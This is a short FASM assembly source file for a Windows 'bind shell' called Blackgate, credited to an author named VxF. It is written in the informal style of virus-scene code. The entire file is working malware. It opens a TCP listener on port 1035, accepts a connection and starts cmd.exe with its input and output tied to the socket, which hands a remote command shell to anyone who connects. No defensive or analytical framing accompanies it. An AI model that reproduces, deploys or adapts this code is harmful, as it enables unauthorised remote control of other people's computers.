;/////////////////////////////////////////////////////////
;
;               Blackgate Bind Shell
;       Description:
;               A very small and sweet bind shell
;               Uses port 1035
;               Compile with FASM
;       Author:
;               VxF
;/////////////////////////////////////////////////////////
format PE GUI
entry ShellStart

include 'import.inc'
include 'bs.inc'

section '.code' code import executable readable writeable

;/////////////////////////////////////////////////////////
;
;               Import section
;
;////////////////////////////////////////////////////////

  library kernel,'KERNEL32.DLL',\
	  winsock,'WS2_32.DLL'

  kernel:
  import CreateProcess,'CreateProcessA'

  winsock:
  import WSAStartup,'WSAStartup',\
	 WSASocket,'WSASocketA',\
	 bind,'bind',\
	 listen,'listen',\
	 accept,'accept',\
	 closesocket,'closesocket'

;/////////////////////////////////////////////////////////
;
;               Code section
;
;////////////////////////////////////////////////////////

ShellStart:
	xor ebp,ebp

	lea eax,[wsa]
	push eax
	push 0x0202
	call [WSAStartup]

	mov [sAddr.sin_port],0x0b04	;port 1035
	mov [sAddr.sin_family],2	;AF_INET

	push ebp			;0
	push ebp			;0
	push ebp			;0
	push 6				;IPPROTO_TCP
	push 1				;SOCK_STREAM
	push 2				;AF_INET
	call [WSASocket]

	mov [bindsocket],eax

	push 16
	lea ebx,[sAddr]
	push ebx
	push eax
	call [bind]

	push 5
	push [bindsocket]
	call [listen]

	push eax			;eax=0 after listen api call
	push eax
	push [bindsocket]
	call [accept]

	mov [bindsocket_],eax

	push [bindsocket]
	call [closesocket]

	mov eax,[bindsocket_]
	mov [starti.hStdInput],eax
	mov [starti.hStdOutput],eax
	mov [starti.hStdError],eax

	lea eax,[processi]
	push eax
	lea eax,[starti]
	push eax
	push ebp			;0
	push ebp			;0
	push ebp			;0
	push 1
	push ebp			;0
	push ebp			;0
	push cmd
	push ebp			;0
	call [CreateProcess]

exitme:
	ret				;yes pockets you read right, I used an ret ;)

;/////////////////////////////////////////////////////////
;
;               Data section
;
;////////////////////////////////////////////////////////

wsa		WSADATA
sAddr		SOCKADDR
processi	PROCESSINFO
starti		STARTUPINFO
cmd		db	'cmd',0
bindsocket	dd	0
bindsocket_	dd	0